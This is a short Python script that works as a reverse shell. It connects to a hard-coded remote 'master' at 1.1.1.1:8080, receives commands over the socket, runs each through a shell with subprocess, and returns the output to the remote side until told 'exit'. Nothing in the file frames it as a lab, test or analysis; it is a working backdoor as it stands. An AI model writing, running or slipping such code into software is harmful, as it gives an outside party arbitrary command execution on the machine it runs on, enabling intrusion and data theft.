import socket
import subprocess


def main():
    print("[+] Connecting to master.")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("1.1.1.1", 8080))
    print("[+] Connected to master")
    while True:
        try:
            msg = s.recv(1024).decode()
        except:
            print("socket error")
        if msg == "exit":
            print("exiting")
            s.close()
            break
        if msg == "":
            continue
        output = subprocess.run([msg], shell=True, capture_output=True)
        if output.stderr.decode() == "":
            response = output.stdout.decode()
        else:
            response = output.stderr.decode()
        s.send(response.encode())


if __name__ == "__main__":
    main()
